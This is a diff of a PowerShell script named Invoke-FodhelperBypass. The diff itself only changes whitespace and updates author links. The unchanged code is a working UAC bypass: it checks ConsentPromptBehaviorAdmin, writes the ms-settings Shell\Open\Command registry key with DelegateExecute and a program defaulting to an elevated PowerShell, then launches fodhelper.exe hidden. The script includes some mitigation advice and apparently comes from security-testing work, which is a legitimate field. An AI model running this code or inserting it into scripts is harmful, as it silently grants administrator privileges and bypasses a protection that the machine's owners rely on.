@@ -6,7 +6,7 @@ This function is used to bypass UAC restrictions for the currently logged in use
 .PARAMETER Program
 Specify the absolute or relative path for executable or application you wish to run with elevated permissions. Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local  computer or in a directory that the local computer can access.
 
-    
+
 .DESCRIPTION
 This cmdlet is used to open an application with full administrative privileges for the currently logged in administrative user. If the registry settings are not configured to prevent this from working it will mention what can be done to prevent this from working.
 
@@ -32,24 +32,24 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
-    
+
 .INPUTS
 None
-    
+
 
 .OUTPUTS
 None
 #>
-Function Invoke-FodhelperBypass { 
+Function Invoke-FodhelperBypass {
     [CmdletBinding()]
         Param(
             [Parameter(
@@ -59,10 +59,10 @@ Function Invoke-FodhelperBypass {
                 ValueFromPipelineByPropertyName=$True,
                 HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
         [String]$Program = "cmd /c start powershell.exe")  # End param
- 
-    BEGIN 
+
+    BEGIN
     {
-        
+
         $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"
 
         Switch ($Value.ConsentPromptBehaviorAdmin)
@@ -83,29 +83,29 @@ Function Invoke-FodhelperBypass {
             Throw "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message"
 
         }  # End If
-        Else 
+        Else
         {
-            
+
             Write-Warning "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message"
             Write-Output "To defend against the fodhelper UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."
 
         }  # End Else
 
         Write-Verbose "Adding registry values..."
-   
+
         New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force
         Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force
 
     }  # End BEGIN
-    PROCESS 
+    PROCESS
     {
-        
+
         Write-Verbose "Executing fodhelper.exe and $Program..."
         Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-        
-    }  # End PROCESS 
-    END 
+
+    }  # End PROCESS
+    END
     {
 
         Write-Verbose "Removing registry values as they should be no longer needed..."
